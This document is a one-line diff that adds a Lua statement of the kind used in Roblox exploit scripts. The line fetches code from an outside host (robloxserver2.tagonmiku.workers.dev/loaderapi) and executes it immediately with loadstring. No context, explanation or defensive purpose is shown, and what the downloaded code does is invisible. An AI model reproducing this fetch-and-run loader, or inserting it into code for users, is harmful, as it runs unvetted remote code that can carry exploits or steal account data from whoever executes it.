@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://robloxserver2.tagonmiku.workers.dev/loaderapi'))()
